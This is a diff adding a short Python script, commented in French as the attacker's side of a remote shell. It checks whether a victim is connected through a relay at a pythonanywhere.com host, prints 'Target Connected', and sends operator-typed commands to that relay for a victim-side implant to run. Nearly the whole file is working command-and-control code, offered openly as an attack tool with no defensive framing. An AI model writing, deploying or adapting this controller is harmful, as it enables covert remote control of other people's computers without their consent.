@@ -1,0 +1,42 @@
+# un des programmes dont l'attaquant peut se servir depuis son ordinateur (remote shell) 
+
+import requests
+from _thread import *
+import time
+
+
+is_connected = ""
+
+def get_data(webpage):
+    url = webpage
+
+    req = requests.get(url, 'html.parser')
+
+    return req.text
+
+def clientResponses():
+    global is_connected
+    while 1:
+        # is conncted ?
+        timeaa = get_data("http://pythonanywherean.pythonanywhere.com/GetConnected/")
+        if time.time()-float(timeaa)<=3:
+            if is_connected!="Yes":
+                print("Target Connected ;)")
+            is_connected = "Yes"
+        else:
+            if is_connected=="Yes":
+                print("Target Lost :(")
+            is_connected = "No"
+
+        time.sleep(2)
+
+
+start_new_thread(clientResponses, ())
+
+while 1:
+    cmd = input("Enter command :")
+    #cmd.replace(" ", "%space%")
+
+    get_data(f"http://pythonanywherean.pythonanywhere.com/AddData/{cmd}/")
+
+
